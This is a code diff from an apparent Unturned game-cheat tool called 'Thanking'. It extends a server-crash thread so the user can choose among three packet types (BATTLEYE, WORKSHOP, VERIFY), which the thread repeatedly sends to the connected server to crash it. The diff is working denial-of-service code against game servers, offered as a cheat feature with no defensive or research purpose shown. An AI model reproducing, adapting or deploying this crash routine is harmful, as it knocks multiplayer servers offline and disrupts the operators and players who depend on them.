@@ -3,6 +3,7 @@ using System.Threading;
 using SDG.Unturned;
 using Steamworks;    
 using Thanking.Attributes;
+using Thanking.Options;
 using Thanking.Overrides;
 using Thanking.Utilities;
 using UnityEngine;
@@ -27,9 +28,25 @@ namespace Thanking.Threads
             {
                 if (AlwaysCrash && OV_Provider.IsConnected)
                     ServerCrashEnabled = true;
-                
+
                 if (ServerCrashEnabled)
-                    Provider.send(Provider.server, ESteamPacket.BATTLEYE, new[] { (byte)ESteamPacket.BATTLEYE }, 1, 0);
+                {
+                    switch (MiscOptions.SCrashMethod)
+                    {
+                        case 0:
+                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, new[] {(byte) ESteamPacket.BATTLEYE},
+                                1, 0);
+                            break;
+                        case 1:
+                            Provider.send(Provider.server, ESteamPacket.WORKSHOP, new[] {(byte) ESteamPacket.WORKSHOP},
+                                1, 0);
+                            break;
+                        case 2:
+                            Provider.send(Provider.server, ESteamPacket.VERIFY, new[] {(byte) ESteamPacket.VERIFY},
+                                1, 0);
+                            break;
+                    }
+                }
                 else
                     Thread.Sleep(1000);
             }
